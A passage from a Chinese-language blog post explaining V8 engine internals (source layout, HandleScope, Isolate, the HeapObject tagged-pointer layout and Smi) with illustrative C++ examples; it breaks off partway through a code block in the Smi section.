|</span><br><span class="line">D      +---ic</span><br><span class="line">       |</span><br><span class="line">       +---heap</span><br><span class="line">E      +---heap-symbols.h</span><br><span class="line">       +---zone</span><br><span class="line">       +---objects</span><br><span class="line">       |</span><br><span class="line">F      +---inspector</span><br><span class="line">       |</span><br><span class="line">       +---base</span><br><span class="line">       +---debug</span><br><span class="line">       +---tracing</span><br><span class="line">       +---extensions</span><br><span class="line">G      +---libplatform</span><br><span class="line">       +---libsampler</span><br><span class="line">       +---third_party</span><br><span class="line">       +---trap-handler</span><br><span class="line">       |</span><br><span class="line">       +---*.cc<span class="comment">/*.h</span></span><br><span class="line"><span class="comment">       .</span></span><br><span class="line"><span class="comment">       .</span></span><br><span class="line"><span class="comment">       .</span></span><br></pre></td></tr></table></figure><ul><li>A:存储汇编代码，反汇编程序，宏汇编程序，模拟器等，对于不同CPU不同。</li><li>B:code generation系统，例如parse, compile, interpreter, etc.</li><li>C:JS built-in function和runtime helper function</li><li>D:Inline Cache code </li><li>E:object model(对象模型)和memory(内存)相关代码</li><li>F:Inspector</li><li>G:Debugging and platform abstraction layer codes are stored.</li></ul><h3 id="必读代码"><a href="#必读代码" class="headerlink" title="必读代码"></a>必读代码</h3><ul><li>api.h/api.cc<br>An API for Embedder is defined.</li><li>objects.h/objects.cc<br>定义了v8的所有对象模型</li><li>compiler/compiler.cc<br>编译的入口点</li><li>compiler/pipeline.cc<br>和compiler.cc关联，放置TurboFan</li><li>runtime/runtime-*.cc<br>A runtime function is defined.</li><li>builtins/builtin-*.cc<br>A faster runtime function group. It is described in CodeStubAssembler (commentary) or Assembler.</li><li>interpreter/*.cc<br>Ignition解释器</li><li>ic/*.cc<br>Inline Caching的实现<br>存储Runtime(?)</li></ul><h2 id="v8的内部实现"><a href="#v8的内部实现" class="headerlink" title="v8的内部实现"></a>v8的内部实现</h2><h3 id="公开API"><a href="#公开API" class="headerlink" title="公开API"></a>公开API</h3><ul><li>v8::HandleScope<br>生成一个虚拟的作用域，监视（绑定）从v8的GC分配的对象</li><li>v8::Local<br>v8有GC，但c++没有GC<br>相反，它通过<a href="https://zh.wikipedia.org/wiki/RAII" target="_blank" rel="noopener">RAII</a> (Resource Acquisition Is Initialization)分配和释放资源<br>在C++中有一个称为析构函数的函数，当分配到stack上的类超出作用域并被丢弃时，该函数被调用。<br>通过v8::Local，当超出了类的作用域时，会自动调用析构函数，析构函数会自动释放资源，实现一种所谓的<a href="http://www.cnblogs.com/TenosDoIt/p/3456704.html" target="_blank" rel="noopener">智能指针</a>功能。<br>v8::Local是一个包装类，用于监视在c++中分配给堆的对象，并在调用析构函数时与当前的HandleScope一起删除。<br>例如：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  v8::Isolate* isolate = v8::Isolate::GetCurrent();</span><br><span class="line">  v8::HandleScope handle_scope;</span><br><span class="line"></span><br><span class="line">  v8::Local&lt;v8::Array&gt; <span class="built_in">array</span> = v8::Array::New(isolate, <span class="number">3</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>创建v8::HandleScope后，所有v8::Local都将分配给该v8::HandleScope。<br>因此，当在测试函数结束时调用handle_scope析构函数时，也会删除与v8 :: HandleScope相关的所有v8::Local。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-124518.png" alt=""></p><ul><li>v8::Handle<br>被v8::Local包装的类，但实际上链接到v8::HandleScope。<br>有些api会返回这个v8::Handle，但基本上它就像v8::Local一样使用。</li><li>v8::Isolate<br>v8::Isolate是v8代码库底层部分的一个非常特殊的部分。<br>最初v8有很多静态方法，对多线程没有太多考虑。<br>嗯，这是有问题的，因为Chromium必须分离进程并启动v8。<br>顺便说一句，事实证明，在Embedder端尝试多线程会导致相当大的问题。<br>出于这个原因，构建了v8::Isolate机制。<br>v8::Isolate是一个存储在<a href="https://blog.csdn.net/linyt/article/details/51931737" target="_blank" rel="noopener">线程本地存储（TLS）</a>中的巨大对象<br>几乎存储了与执行上下文链接的所有全局信息。<br>由于它存储在Tls中，因此可以透明地为每个线程提供不同的v8::Isolate，因此Embedder端可以在对其他线程不了解的情况下编写代码。<br><strong>内部使用的各种对象（FixedArray）和表示隐藏类等的Map类也是从这个v8::Isolate生成的</strong>。<br>几乎所有地方都传递了这个类，没有v8::Isolate就很难编写代码。<br>再次使用上面的示例代码<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-09-102213.jpg" alt=""><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  v8::Isolate* isolate = v8::Isolate::GetCurrent();</span><br><span class="line">  v8::HandleScope handle_scope;</span><br><span class="line"></span><br><span class="line">  v8::Local&lt;v8::Array&gt; <span class="built_in">array</span> = v8::Array::New(isolate, <span class="number">3</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>你还可以看到此函数也传递了v8::Isolate。<br>它是v8::Array::New等等，但是v8::Isoalte实际上生成了这个数组。<br>因此，在v8中，没有太多需要考虑线程冲突，所以这是一个相当方便的机制。</p><h3 id="v8-internal"><a href="#v8-internal" class="headerlink" title="v8::internal"></a>v8::internal</h3><p>除了外部公共API之外的所有类，都在v8::internal命名空间中定义。</p><h3 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h3><p>v8非常特殊，它在C++中创建自己的对象模型。<br>该对象模型在src/objects.h的开头注释中描述，<br>当它被简化和提取时，就会变成这样。</p><ul><li>Object<ul><li>Smi (immediate small integer)</li><li>HeapObject (superclass for everything allocated in the heap)<ul><li>JSReceiver (suitable for property access)<ul><li>JSObject</li><li>JSProxy</li></ul></li><li>FixedArrayBase<ul><li>ByteArray</li><li>BytecodeArray</li><li>FixedArray</li><li>FixedDoubleArray</li></ul></li><li>Name<ul><li>String</li><li>Symbol</li></ul></li><li>HeapNumber</li><li>BigInt</li><li>Cell</li><li>PropertyCell</li><li>PropertyArray</li><li>Code</li><li>AbstractCode, a wrapper around Code or BytecodeArray</li><li>Map</li><li>Oddball</li><li>Foreign</li><li>SmallOrderedHashTable</li><li>SharedFunctionInfo</li><li>Struct</li><li>WeakCell</li><li>FeedbackVector</li></ul></li></ul></li></ul><p>我们创建了一个以v8::i::Object为基类的对象树。<br>几乎所有在v8中使用的类都继承自v8::i::Object，这看起来像java。<br>v8不遵循c++方式使这个对象模型运行良好。<br>由于某些原因，这些类不通过c++类来创建字段。<br>这些类仅用于表示c++中的内存布局，并且所有字段都是通过直接为此指针指定偏移量来获得的。<br>换句话说，忽略c++对象布局，我们自己完全控制内存布局。<br>当以伪代码表示时，看起来像这样：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Class SomeObject &#123;</span><br><span class="line">  <span class="function">Value* <span class="title">get_field1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* self = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="keyword">this</span>);</span><br><span class="line">    self += header_offset;</span><br><span class="line">    <span class="keyword">return</span> Value::Cast(self);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* self = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="keyword">this</span>);</span><br><span class="line">    self += header_offset;</span><br><span class="line">    *self = Smi::Cast(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> OBJECT_SIZE = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">32</span>;</span><br><span class="line">SomeObject* object = <span class="keyword">reinterpret_cast</span>&lt;SomeObject*&gt;(<span class="built_in">malloc</span>(OBJECT_SIZE));</span><br><span class="line">object-&gt;Initialize();</span><br><span class="line">object-&gt;get_filed1(); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p><p>通过这种方式，你可以自己控制字段的偏移。<br>让我们了解一下层次结构顶端的两个分支：</p><h3 id="HeapObject"><a href="#HeapObject" class="headerlink" title="HeapObject"></a>HeapObject</h3><p>首先是v8::i::HeapObject。<br>由于v8::i::Object建立了如上所述的直接通过偏移的内存布局<br>在访问字段时，继承HeapObject的对象使用以下宏。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIELD_ADDR(p, offset) \</span></span><br><span class="line">  (<span class="keyword">reinterpret_cast</span>&lt;byte*&gt;(p) + offset - kHeapObjectTag)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_FIELD(p, offset) \</span></span><br><span class="line">  (*<span class="keyword">reinterpret_cast</span>&lt;Object* <span class="keyword">const</span>*&gt;(FIELD_ADDR_CONST(p, offset)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是在GC并发标记为ON时以原子方式更新字段</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> v8_CONCURRENT_MARKING</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_FIELD(p, offset, value)                             \</span></span><br><span class="line">  base::Relaxed_Store(                                            \</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord*&gt;(FIELD_ADDR(p, offset)), \</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord&gt;(value));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_FIELD(p, offset, value) \</span></span><br><span class="line">  (*<span class="keyword">reinterpret_cast</span>&lt;Object**&gt;(FIELD_ADDR(p, offset)) = value)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">SMI_ACCESSORS(FixedArrayBase, length, kLengthOffset)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMI_ACCESSORS_CHECKED(holder, name, offset, condition) \</span></span><br><span class="line">  <span class="keyword">int</span> holder::name() <span class="keyword">const</span> &#123;                                   \</span><br><span class="line">    DCHECK(condition);                                         \</span><br><span class="line">    Object* value = READ_FIELD(<span class="keyword">this</span>, offset);                  \</span><br><span class="line">    <span class="keyword">return</span> Smi::ToInt(value);                                  \</span><br><span class="line">  &#125;                                                            \</span><br><span class="line">  <span class="keyword">void</span> holder::set_#<span class="meta">#name(int value) &#123;                         \</span></span><br><span class="line">    DCHECK(condition);                                         \</span><br><span class="line">    WRITE_FIELD(<span class="keyword">this</span>, offset, Smi::FromInt(value));            \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际上它扩展如下。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FixedArrayBase::length() <span class="keyword">const</span> &#123;</span><br><span class="line">  DCHECK(condition);</span><br><span class="line">  Object* value = (*<span class="keyword">reinterpret_cast</span>&lt;Object* <span class="keyword">const</span>*&gt;(</span><br><span class="line">  <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> byte*&gt;(<span class="keyword">this</span>) + kLengthOffset - kHeapObjectTag)</span><br><span class="line">  <span class="keyword">return</span> Smi::ToInt(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FixedArrayBase::set_length(<span class="keyword">int</span> value) <span class="keyword">const</span> &#123;</span><br><span class="line">  DCHECK(condition);</span><br><span class="line">  base::Relaxed_Store(</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord*&gt;(</span><br><span class="line">          <span class="keyword">reinterpret_cast</span>&lt;byte*&gt;(<span class="keyword">this</span>) + kLengthOffset - kHeapObjectTag);</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord&gt;(Smi::FromInt(value)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重要的是<br><code>reinterpret_cast&lt;const byte*&gt;(this) + kLengthOffset - kHeapObjectTag</code><br>在这部分中，我们看到在将特定字段的偏移量添加到此指针后减去kHeapObjectTag。<br>顺便说一句，kHeapObjectTag的定义如下。<br><code>const int kHeapObjectTag = 1</code><br>只有1，也就是说，只需在指针地址的末尾设置1即可。</p><p>以下是示例代码<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTagSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">intptr_t</span> kHeapObjectTagMask = (<span class="number">1</span> &lt;&lt; kHeapObjectTagSize) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">HasHeapObjectTag</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(value) &amp; kHeapObjectTagMask) ==</span><br><span class="line">          kHeapObjectTag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> allocated = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(</span><br><span class="line">      <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (<span class="number">2</span> + kHeapObjectTag)));</span><br><span class="line">  <span class="keyword">auto</span> heap_object = allocated + kHeapObjectTag;</span><br><span class="line">  heap_object[<span class="number">0</span>] = <span class="string">'m'</span>;</span><br><span class="line">  heap_object[<span class="number">1</span>] = <span class="string">'v'</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%ld %ld %p %p %d\n"</span>, <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(allocated),</span><br><span class="line">         <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(heap_object), allocated, heap_object,</span><br><span class="line">         HasHeapObjectTag(heap_object));</span><br><span class="line">  <span class="built_in">free</span>(allocated);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果如下：<br><code>140289524108464 140289524108465 0x7f97b3400cb0 0x7f97b3400cb1 1</code><br>地址以1结尾。<br>另外，v8::i::HeapObject在开头有一个v8::Map对象来表示隐藏类，以便识别它自己的类型。<br>所以v8::i::HeapObject的内存布局如下。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-09-163310.png" alt=""><br>由于我们总是有一个表示类型的v8::Map，我们可以通过查看它来看到v8::i ::HeapObject的类型。<br>此外，写为Derived Object Header的部分根据继承的对象而不同（如果它是v8::i::FixedArray则是长度字段）。<br>下面是Map和JSObject C ++代码的简化表示<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTagSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">intptr_t</span> kHeapObjectTagMask = (<span class="number">1</span> &lt;&lt; kHeapObjectTagSize) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">HasHeapObjectTag</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(value) &amp; kHeapObjectTagMask) ==</span><br><span class="line">          kHeapObjectTag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Map</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">enum</span> InstanceType &#123;</span><br><span class="line">    JS_OBJECT,</span><br><span class="line">    JS_ARRAY,</span><br><span class="line">    JS_STRING</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_instance_type</span><span class="params">(InstanceType instance_type)</span> </span>&#123;</span><br><span class="line">    instance_type_ = instance_type;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">InstanceType <span class="title">instance_type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> instance_type_;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  InstanceType instance_type_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeaderSize = <span class="keyword">sizeof</span>(Map);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> byte;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span>* Address;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeapObject</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">char</span> <span class="title">value</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>)[<span class="number">0</span>];&#125;</span><br><span class="line">  Map::<span class="function">InstanceType <span class="title">instance_type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Map*&gt;(</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>) - kHeaderSize)-&gt;instance_type();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> top = <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>) - kHeaderSize - kHeapObjectTag;</span><br><span class="line">    <span class="built_in">free</span>(top);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">protected</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> Address <span class="title">NewType</span><span class="params">(Map::InstanceType instance_type, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> allocated = <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(byte) * (size + kHeaderSize + kHeapObjectTag)));</span><br><span class="line">    <span class="keyword">auto</span> <span class="built_in">map</span> = <span class="keyword">reinterpret_cast</span>&lt;Map*&gt;(allocated);</span><br><span class="line">    <span class="built_in">map</span>-&gt;set_instance_type(instance_type);</span><br><span class="line">    <span class="keyword">return</span> allocated + kHeaderSize + kHeapObjectTag;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSObject</span>:</span> <span class="keyword">public</span> HeapObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSObject* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_OBJECT, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'o'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSObject*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSArray</span>:</span> <span class="keyword">public</span> JSObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSArray* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_ARRAY, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSArray*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSString</span>:</span> <span class="keyword">public</span> JSObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSString* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_STRING, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'s'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSString*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  JSObject* objects[] = &#123;</span><br><span class="line">    JSObject::New(),</span><br><span class="line">    JSArray::New(),</span><br><span class="line">    JSString::New()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">auto</span> o = objects[i];</span><br><span class="line">    <span class="keyword">switch</span> (o-&gt;instance_type()) &#123;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_OBJECT:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSObject =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_ARRAY:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSArray =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_STRING:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSString =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    objects[i]-&gt;Free();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>执行时，输出JSObject =&gt; o，JSArray =&gt; a，JSString =&gt; s。<br>我认为这个例子有点长，但我认为你可以看到：你可以正确地分配分配给堆的对象类型。<br>让我们解释一下Smi正在做些什么。</p><h3 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h3><p>Smi是Small Integer的缩写，可以直接在指针区域中保存最多31位的整数。<br>似乎Ruby中也采用了相同的方法。<br>对于普通指针，32位CPU使用4个字节,64位CPU使用8个字节。<br>换句话说，如果它是一个高达31位的整数，则可以存储它而不是使用指针。<br>以这种方式，通过将其固定在指针区域中而不使用堆，实现了存储器节省和加速。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 